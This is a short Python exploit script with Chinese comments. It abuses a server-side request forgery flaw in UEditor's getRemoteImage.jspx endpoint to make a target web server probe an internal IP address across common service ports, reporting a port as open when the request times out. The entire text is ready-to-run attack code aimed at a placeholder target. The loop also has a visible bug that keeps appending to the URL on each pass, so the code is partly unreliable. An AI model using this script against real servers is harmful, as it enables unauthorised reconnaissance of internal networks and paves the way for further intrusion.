import requests
def portscan(url,rurl):
    # 测试端口，根据需求增加或修改
    ports = [21,22,23,25,80,443,445,873,1080,1099,1090,1521,3306,6379,27017]
    for port in ports:
        try:
            url = url +'/ueditor/getRemoteImage.jspx?upfile=' + rurl +':{port}'.format(port=port)
            response = requests.get(url,timeout=6)
        except:
            #超过6秒就认为端口是开发的，如果端口不开放，目标肯定挥发一个tcp rest，连接会中断，说明漏洞存在
            print('[+]{port} is open'.format(port=port))

if __name__ == '__main__':
    portscan("http://www.target.com",'192.168.23.1')
    